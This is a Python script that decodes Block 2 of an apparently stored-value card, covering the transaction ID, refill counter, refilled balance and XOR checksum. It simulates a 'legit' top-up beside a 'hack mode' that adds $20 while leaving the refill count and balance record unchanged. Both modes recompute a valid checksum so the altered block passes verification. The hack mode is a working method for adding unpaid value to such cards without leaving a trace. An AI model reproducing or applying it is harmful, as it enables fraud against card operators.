#!/usr/bin/env python3
"""
Test Legit Mode vs Hack Mode for Block 2 updates
"""
import struct

def analyze_block2(hex_string):
    """Analyze Block 2 structure"""
    bytes_data = bytes.fromhex(hex_string.replace(' ', ''))

    print(f"Block 2: {hex_string}")
    print(f"  Signature:      0x{bytes_data[0]:02X}{bytes_data[1]:02X}")

    # Transaction ID (24-bit)
    tx_id = bytes_data[2] | (bytes_data[3] << 8) | (bytes_data[4] << 16)
    print(f"  Transaction ID: 0x{tx_id:06X} ({tx_id})")

    # Refill times
    refill_times = bytes_data[5]
    print(f"  Refill Times:   {refill_times}")

    # Refilled balance
    refilled_balance = struct.unpack('<H', bytes_data[9:11])[0]
    print(f"  Refilled Bal:   ${refilled_balance/100:.2f} ({refilled_balance} cents)")

    # Checksum
    checksum = 0
    for i in range(16):
        checksum ^= bytes_data[i]
    print(f"  Checksum XOR:   0x{checksum:02X} {'✓ PASS' if checksum == 0 else '✗ FAIL'}")
    print()

def simulate_update(original_hex, transaction_cents, legit_mode):
    """Simulate Block 2 update"""
    new_b2 = bytearray(bytes.fromhex(original_hex.replace(' ', '')))

    # Update transaction ID at bytes 2-4 (24-bit)
    old_tx_id = new_b2[2] | (new_b2[3] << 8) | (new_b2[4] << 16)
    new_tx_id = (old_tx_id + 1) & 0xFFFFFF
    new_b2[2] = new_tx_id & 0xFF
    new_b2[3] = (new_tx_id >> 8) & 0xFF
    new_b2[4] = (new_tx_id >> 16) & 0xFF

    if legit_mode:
        # Increment refill times
        current_refills = new_b2[5]
        new_b2[5] = (current_refills + 1) & 0xFF

        # Update refilled balance
        new_b2[9:11] = struct.pack('<H', transaction_cents)

    # Recalculate checksum
    checksum = 0
    for i in range(15):
        checksum ^= new_b2[i]
    new_b2[15] = checksum

    return " ".join([f"{b:02X}" for b in new_b2])

# Original Block 2 from test card
original = "01 01 C5 CB AB 02 00 00 00 7E 04 01 00 00 00 DC"

print("="*60)
print("ORIGINAL BLOCK 2")
print("="*60)
analyze_block2(original)

print("="*60)
print("HACK MODE - Add $20.00 (2000 cents)")
print("="*60)
hack_result = simulate_update(original, 2000, legit_mode=False)
analyze_block2(hack_result)

print("="*60)
print("LEGIT MODE - Add $20.00 (2000 cents)")
print("="*60)
legit_result = simulate_update(original, 2000, legit_mode=True)
analyze_block2(legit_result)

print("="*60)
print("COMPARISON")
print("="*60)
print(f"Original:   {original}")
print(f"Hack Mode:  {hack_result}")
print(f"Legit Mode: {legit_result}")
print()
print("Key differences:")
print("  - Byte 5 (Refill Times):")
print(f"    Original: {bytes.fromhex(original.replace(' ', ''))[5]}")
print(f"    Hack:     {bytes.fromhex(hack_result.replace(' ', ''))[5]} (unchanged)")
print(f"    Legit:    {bytes.fromhex(legit_result.replace(' ', ''))[5]} (incremented)")
print()
print("  - Bytes 9-10 (Refilled Balance):")
orig_refill = struct.unpack('<H', bytes.fromhex(original.replace(' ', ''))[9:11])[0]
hack_refill = struct.unpack('<H', bytes.fromhex(hack_result.replace(' ', ''))[9:11])[0]
legit_refill = struct.unpack('<H', bytes.fromhex(legit_result.replace(' ', ''))[9:11])[0]
print(f"    Original: ${orig_refill/100:.2f}")
print(f"    Hack:     ${hack_refill/100:.2f} (unchanged)")
print(f"    Legit:    ${legit_refill/100:.2f} (updated to transaction amount)")
print()
print("✓ Both modes maintain valid checksum!")
